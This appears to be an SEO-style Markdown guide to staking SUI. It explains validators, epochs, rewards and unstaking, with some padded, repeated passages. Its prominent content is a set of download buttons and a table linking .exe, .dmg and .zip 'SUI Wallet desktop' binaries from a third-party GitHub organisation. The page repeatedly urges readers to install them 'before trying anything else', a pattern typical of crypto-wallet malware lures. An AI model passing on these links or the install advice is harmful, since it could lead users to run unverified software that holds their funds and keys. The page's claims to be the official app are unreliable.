![SUI Wallet](assets/banner-article.png)

# Staking SUI in the wallet app

Delegation happens inside the app; the stake stays yours while it earns.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Staking locks SUI with a validator and earns a share of the network's rewards. The app lists validators with their rate, commission, voting power and uptime, and the stake can be moved after you unstake. Rewards accrue inside the position and return with the principal rather than arriving as a separate payment.

## What staking commits

Staking is a transaction that moves SUI from your spendable balance into a position tied to one validator. While the position exists, that SUI is not available to send, which is why the balance and the stake are two different figures.

That is the trade: liquidity for a share of the network's rewards. Nothing about it is custodial, because the position belongs to your account and only your account can move it.

Nothing about that commitment is custodial and nothing is signed away: the position belongs to your account, and ending it is a transaction your own account authorises. What changes while it is open is liquidity rather than ownership, which is why a staked balance still counts as yours in every sense except spending it.

That is the whole position in one sentence.

## Choosing a validator in the app

The list shows four figures beside each name: the rate, the commission the validator takes, the voting power it already holds, and its uptime. Those four are the whole decision, and they pull in different directions when read together, which is the skill the screen asks for.

A high rate with a high commission can net less than a lower rate with a low commission. A validator with enormous voting power adds to concentration even when its numbers look excellent. [Choosing a Sui validator](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/choosing-a-sui-validator.md) takes each figure on its own, including what to do when two validators look identical.

Two validators with identical rates can differ completely in how they run their infrastructure, which is what uptime records and what a rate can never show. Reading the four figures in the order the app shows them - rate, commission, voting power, uptime - is a routine that takes under a minute. Skipping it is how a stake ends up with a validator nobody would have chosen deliberately.

## The epoch and when rewards appear

The network works in epochs, and staking and its rewards are accounted for within them. That word explains most of the confusion in staking support threads, because it sets the rhythm for when a position starts earning and when a change takes effect.

What a reader needs from this page is the shape rather than a number: rewards are not a daily payout, they accumulate inside the position, and the staking screen shows the position rather than a series of deposits. [SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) covers the rate itself and why it moves.

## Where the rewards go

Rewards accrue inside the position. They are not transferred to your spendable balance each epoch as a separate incoming payment, which is why nobody sees a stream of small credits, and why the balance and the stake disagree while it is open.

When you unstake, the principal comes back with what it earned. That is the moment the rewards become a number you can spend, and it is also why the position's value and the balance disagree while it is staked.

## The risks, plainly

Three risks are worth naming, and none of them is exotic. The first is the network's own: staking depends on the chain working. The second is the validator's: a validator that performs badly earns less. The third is yours: a staked position is not spendable, so a reader who stakes everything has nothing left to pay a fee with.

That last one is the mistake people actually make. Leave a working balance, and the stake stays a decision rather than an emergency.

A fourth risk is easier to overlook: the validator list is evidence, not advice. Nothing in the app says which validator to choose, and no page here will either. The list gives you the material for a decision that stays yours, and that you can revisit by unstaking and delegating again - which is the honest arrangement, and the reason the next article exists.

## Unstaking and the wait

Unstaking is a transaction like the stake was, and it is not instant. The position returns to the account with its accrued rewards, and until then it is still staked, which is the state the screen is describing when it looks unchanged.

The app shows the position's state, which is the honest answer to "is it free yet" - a page cannot tell you, because the timing depends on the network rather than on the wallet. [Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) covers what the screen shows and what to check before assuming the stake is stuck.

## FAQ

### Can I lose my crypto if I stake it?

The position stays yours; staking does not hand custody to the validator. What you can lose is the ability to spend it while it is staked, and some of the expected reward if the validator underperforms.

### Does SUI have staking?

Yes, natively in the app: a validator list, a delegate action, and rewards that accrue inside the position.

### How do I stake SUI and choose a validator?

Open the staking screen, pick a validator on the four figures it shows, enter the amount, and approve the transaction. Leave spendable SUI behind for the fee.

### How does Sui staking work?

Your SUI is committed to a validator for a period measured in epochs. It earns a share of the network's rewards, which accumulate in the position and return with the principal when you unstake.

### Is staking risky?

The chain and the validator both matter, but the most common loss is self-inflicted: staking the whole balance and having nothing left to pay a fee. Stake part of it.

### Do I need the current release to stake?

It is the version the staking screens are described from. Install it from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) before working through a screen you cannot find.
